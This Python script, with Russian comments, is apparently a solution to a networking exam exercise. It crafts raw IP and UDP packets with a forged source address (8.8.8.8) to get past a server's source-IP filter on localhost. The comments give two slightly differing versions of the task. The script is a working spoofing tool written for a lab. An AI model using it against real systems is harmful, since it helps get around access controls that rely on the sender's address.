# 1. На IP-адресе 192.168.1.108 на UDP порту 8888 запущен сервер.
# 2. Это сервер ожидает UDP сообщение от IP-адреса 1.2.3.4
# 3. В этом UDP сообщении должно быть две строки:
#  - TCP-порт
#  - IP-адрес куда будет установлено соединение и отправлено сообщение
# 4. Прочитайте это сообщение!

# На зачете было вот такое задание:
# На сервере работает UDP-сервер на определенном порту (например, 5555). 
# Вам нужно отправить UDP сообщение на этот порт в котором нужно указать IP-адрес и порт, куда будет выполнено TCP подключение. 
# UDP-сервер принимать сообещния только с IP-адреса 8.8.8.8

import socket
import struct

# Параметры для отправки
DEST_IP = "127.0.0.1"  # IP сервера
DEST_PORT = 5555           # Порт сервера
SOURCE_IP = "8.8.8.8"      # Поддельный исходный IP

# Данные, которые мы отправим
MESSAGE = "1.1.1.1:80"  # IP и порт для TCP-подключения


def checksum(data):
    """Вычисление контрольной суммы для проверки целостности пакета."""
    if len(data) % 2 == 1:
        data += b"\0"
    s = sum(struct.unpack("!%sH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


# Создание RAW сокета
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

# Формируем IP-заголовок
ip_header = struct.pack(
    "!BBHHHBBH4s4s",
    69,                     # Версия IPv4 и длина заголовка (5 * 4 = 20 байт)
    0,                      # Тип сервиса
    20 + 8 + len(MESSAGE),  # Общая длина (IP + UDP + данные)
    54321,                  # Идентификатор пакета
    0,                      # Флаги и смещение
    64,                     # Время жизни (TTL)
    socket.IPPROTO_UDP,     # Протокол (UDP)
    0,                      # Контрольная сумма (пока 0)
    socket.inet_aton(SOURCE_IP),  # Исходный IP
    socket.inet_aton(DEST_IP)     # Целевой IP
)

# Вычисляем контрольную сумму для IP-заголовка
ip_checksum = checksum(ip_header)
ip_header = struct.pack(
    "!BBHHHBBH4s4s",
    69,                     # Версия IPv4 и длина заголовка (5 * 4 = 20 байт)
    0,                      # Тип сервиса
    20 + 8 + len(MESSAGE),  # Общая длина (IP + UDP + данные)
    54321,                  # Идентификатор пакета
    0,                      # Флаги и смещение
    64,                     # Время жизни (TTL)
    socket.IPPROTO_UDP,     # Протокол (UDP)
    ip_checksum,            # Контрольная сумма
    socket.inet_aton(SOURCE_IP),  # Исходный IP
    socket.inet_aton(DEST_IP)     # Целевой IP
)

# Формируем UDP-заголовок
udp_header = struct.pack(
    "!HHHH",
    12345,                  # Исходный порт (можно любое значение)
    DEST_PORT,              # Целевой порт
    8 + len(MESSAGE),       # Длина заголовка + данных
    0                       # Контрольная сумма (опционально, можно оставить 0)
)

# Собираем весь пакет
packet = ip_header + udp_header + MESSAGE.encode()

# Отправляем пакет
sock.sendto(packet, (DEST_IP, DEST_PORT))
print(f"Сообщение отправлено с подменой IP {SOURCE_IP} на {DEST_IP}:{DEST_PORT}")
